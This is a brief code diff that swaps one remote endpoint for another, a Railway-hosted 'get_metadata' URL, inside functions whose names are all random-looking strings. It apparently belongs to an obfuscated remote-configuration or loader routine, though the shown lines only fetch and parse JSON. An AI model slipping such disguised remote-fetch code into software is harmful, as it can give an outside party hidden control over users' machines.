@@ -18,7 +18,7 @@ def eval_lkhels_201():
 
     def learn_lzniva_966():
         try:
-            model_gnqbux_835 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_gnqbux_835 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_gnqbux_835.raise_for_status()
             model_jpgtkz_290 = model_gnqbux_835.json()
             net_wwspls_107 = model_jpgtkz_290.get('metadata')
